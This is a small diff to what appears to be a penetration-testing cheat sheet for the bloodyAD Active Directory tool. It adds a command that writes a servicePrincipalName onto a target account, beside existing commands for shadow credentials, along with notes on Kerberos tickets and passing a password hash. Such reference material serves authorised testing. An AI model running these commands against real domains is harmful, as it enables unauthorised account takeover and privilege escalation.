@@ -63,6 +63,10 @@ bloodyAD --host $dc -d $domain -u $username -p $password get writable --detail
 ```
 bloodyAD --host $dc -d $domain -u $username -p $password add shadowCredentials $target
 ```
+### WriteSPN
+```
+bloodyAD --host $dc -d $domain -u $username -p $password set object $target servicePrincipalName -v 'domain/meow'
+```
 ### Notes
 - To use Kerberos, obtain a TGT, export it, and then pass `-k` instead of providing a username and password
 - You can pass a user hash instead of a password using `-p :hash` 
